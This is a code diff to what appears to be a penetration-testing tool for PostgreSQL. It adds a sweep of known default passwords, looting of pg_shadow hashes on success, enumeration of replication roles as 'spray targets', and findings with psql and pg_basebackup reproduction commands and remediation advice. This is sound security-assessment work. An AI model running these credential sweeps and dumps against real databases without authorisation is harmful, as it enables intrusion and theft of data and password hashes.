@@ -138,6 +138,40 @@ def _do_auth(sock: socket.socket, user: str, password: str | None) -> bool:
     return typ == b"R" and len(body) >= 4 and struct.unpack("!I", body[:4])[0] == 0
 
 
+# Common postgres default credentials seen in the wild — docker images that
+# expose 5432 with POSTGRES_PASSWORD unset (or set to the same as the user),
+# Bitnami quick-start defaults, dev environments left on prod. Sweep is small
+# and read-only; the goal is "did the tester leave a default", not brute-force.
+_WEAK_PG_CREDS: list[tuple[str, str]] = [
+    ("postgres", "postgres"),
+    ("postgres", "password"),
+    ("postgres", "admin"),
+    ("postgres", "root"),
+    ("postgres", "postgres123"),
+    ("admin", "admin"),
+    ("root", "root"),
+]
+
+
+def weak_password_sweep(ip: str, port: int, timeout: float = _TIMEOUT) -> tuple[str, str] | None:
+    """Try each entry in _WEAK_PG_CREDS. Returns the first (user, password) pair
+    that authenticates, or None. Called ONLY when probe() says auth_required
+    and the tester-supplied credentials all failed — this is a targeted
+    default-cred check, not a general credential attack.
+
+    Each attempt is a full connection; on failure the socket closes cleanly
+    and we move on. No account lockout risk on Postgres — pg_hba failures
+    don't lock users. Total wall-clock: ~5 seconds worst case (7 attempts *
+    ~700ms each) since Postgres closes fast on bad auth."""
+    for user, password in _WEAK_PG_CREDS:
+        try:
+            if authenticate(ip, port, user, password, timeout=timeout):
+                return (user, password)
+        except Exception:
+            continue
+    return None
+
+
 def authenticate(ip: str, port: int, user: str, password: str,
                  timeout: float = _TIMEOUT, db: str = "postgres") -> bool:
     """Try one credential against a Postgres endpoint. Returns True if it logs in. No
@@ -278,6 +312,16 @@ def loot(ip: str, port: int, timeout: float = _TIMEOUT, user: str = "postgres",
         out["extensions"] = [r[0] for r in _simple_query(
             sock, "SELECT extname FROM pg_extension WHERE extname IN "
             "('plpythonu','plpython3u','plperlu','pltclu','plsh') ORDER BY 1")]
+        # Replication roles = accounts that can pg_basebackup the entire cluster
+        # (physical copy of every DB, every hash, every extension). A weak
+        # password on ANY of these = full DB compromise. Enumerate them
+        # separately so findings can call them out with the right severity.
+        try:
+            out["replication_roles"] = [r[0] for r in _simple_query(
+                sock, "SELECT rolname FROM pg_roles WHERE rolreplication "
+                "ORDER BY 1")]
+        except (OSError, struct.error, ValueError):
+            out["replication_roles"] = []
         # Lateral-pivot surface: dblink / postgres_fdw let a (super)user open outbound
         # connections to OTHER database hosts the app can reach - pivot + SSRF.
         out["pivot_ext"] = [r[0] for r in _simple_query(
@@ -484,15 +528,48 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
             elif pr.get("cred_access"):
                 lt = pr.get("loot") or {}
                 who = pr.get("cred_user", "?")
-                out.append(_finding(
-                    "high", "PostgreSQL credentialed access (looted / weak credential)", tgt,
-                    f"recce logged in as '{who}' with a credential from the engagement"
-                    + (f"; server_version {ver}" if ver else "")
-                    + ". The account has database access." + _loot_text(lt),
-                    f"psql 'host={h.ip} port={p.portid} user={who} dbname=postgres'",
-                    "Rotate the credential; enforce least privilege; bind to a trusted "
-                    "interface; require TLS.",
-                    ["CWE-522", "CWE-284"], kind="pg_cred_access"))
+                # Weak-default hit gets its own critical-severity finding —
+                # the specific bug is "the deploy left the default password",
+                # which is more actionable than the generic credentialed
+                # access story.
+                if pr.get("cred_source") == "weak_default":
+                    out.append(_finding(
+                        "critical",
+                        "PostgreSQL default credentials still active", tgt,
+                        f"The account '{who}' authenticates with a known Postgres default "
+                        f"password. Anyone who reaches port {p.portid} + tries the well-known "
+                        f"defaults gets in as this account."
+                        + (f" server_version {ver}." if ver else "")
+                        + _loot_text(lt),
+                        f"psql 'host={h.ip} port={p.portid} user={who} dbname=postgres'",
+                        "Set a strong unique password for every Postgres role — never leave "
+                        "docker/quick-start defaults on a reachable database.",
+                        ["CWE-521", "CWE-798", "CWE-1392"], kind="pg_default_creds"))
+                else:
+                    out.append(_finding(
+                        "high", "PostgreSQL credentialed access (looted / weak credential)", tgt,
+                        f"recce logged in as '{who}' with a credential from the engagement"
+                        + (f"; server_version {ver}" if ver else "")
+                        + ". The account has database access." + _loot_text(lt),
+                        f"psql 'host={h.ip} port={p.portid} user={who} dbname=postgres'",
+                        "Rotate the credential; enforce least privilege; bind to a trusted "
+                        "interface; require TLS.",
+                        ["CWE-522", "CWE-284"], kind="pg_cred_access"))
+                # Replication-role enumeration — accounts that can pg_basebackup.
+                # Emit a separate high finding listing them by name so the
+                # tester knows which credentials are priority spray targets.
+                rep_roles = lt.get("replication_roles") or []
+                if rep_roles:
+                    out.append(_finding(
+                        "high",
+                        "PostgreSQL replication roles enumerated", tgt,
+                        f"Roles with the REPLICATION attribute: {', '.join(rep_roles)}. "
+                        f"Any of these accounts with a weak password permits pg_basebackup "
+                        f"— physical dump of every database, every hash, every extension.",
+                        f"pg_basebackup -h {h.ip} -p {p.portid} -U <role> -D /tmp/copy",
+                        "Rotate passwords on replication roles to strong unique values; "
+                        "restrict replication traffic to a private interface via pg_hba.conf.",
+                        ["CWE-798", "CWE-522"], kind="pg_replication_roles"))
                 _rce_finding(out, tgt, h.ip, p.portid, lt, credentialed=True, user=who,
                              proof=pr.get("rce_proof"))
                 _datamine_finding(out, tgt, h.ip, p.portid, pr.get("datamine"))
@@ -673,6 +750,28 @@ def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
                             src = "postgres-loot"
                             note = f"pg_shadow hash via credentialed PostgreSQL ({u})"
                             break
+                    # None of the engagement credentials worked — try a small,
+                    # targeted list of well-known Postgres defaults. If one
+                    # hits, mark it distinctly (cred_source='weak_default') so
+                    # findings emits a specific "default cred still active" bug
+                    # rather than a generic credentialed-access finding.
+                    if not pr.get("cred_access"):
+                        weak = weak_password_sweep(t["ip"], t["port"])
+                        if weak:
+                            u, pw = weak
+                            pr["cred_access"] = True
+                            pr["cred_user"] = u
+                            pr["cred_source"] = "weak_default"
+                            acc_user, acc_pw = u, pw
+                            lt = loot(t["ip"], t["port"], user=u, password=pw)
+                            pr["loot"] = lt
+                            t["cred_access"] = True
+                            src = "postgres-loot"
+                            note = f"pg_shadow hash via weak-default cred ({u}:{pw})"
+                            looted.append(Credential(
+                                username=u, secret=pw, kind="password",
+                                source="postgres-weak-default", origin_ip=t["ip"],
+                                notes=f"weak default postgres cred works :{t['port']}"))
                 if lt:
                     for hh in lt.get("hashes", []):
                         looted.append(Credential(
